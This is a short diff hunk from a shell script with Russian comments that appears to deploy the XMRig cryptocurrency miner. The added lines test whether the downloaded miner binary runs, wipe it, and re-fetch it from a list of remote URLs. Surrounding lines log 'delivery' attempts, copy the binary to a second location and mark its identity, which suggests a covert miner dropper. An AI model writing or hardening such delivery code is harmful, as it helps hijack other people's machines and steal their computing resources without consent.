@@ -119,6 +119,16 @@ if [ ! -x "$D/xmrig" ] && [ -n "$URLS" ] && [ -n "$MACHINE" ]; then
     kf_log "доставка не удалась"
   fi
 fi
+
+# бинарь должен реально запускаться: обрезанная докачка даёт ELF-заголовок и SIGSEGV
+if [ -x "$D/xmrig" ] && ! "$D/xmrig" --version >/dev/null 2>&1; then
+  kf_log "бинарь не запускается (обрезан или чужая арх) — качаем заново"
+  rm -f "$D/xmrig" "$D/.bin.tag" 2>/dev/null
+  if kf_fetch_miner "$D/xmrig" "$ARCH" "$MACHINE" $URLS; then
+    printf '%s' "$KF_BIN_TAG" > "$D/.bin.tag" 2>/dev/null
+  fi
+  "$D/xmrig" --version >/dev/null 2>&1 || { kf_log "бинарь так и не запустился — майнер не ставим"; rm -f "$D/xmrig"; }
+fi
 if [ -x "$D/xmrig" ]; then
   cp "$D/xmrig" "$S/xmrig" 2>/dev/null
   kf_mark_identity "$D/xmrig"
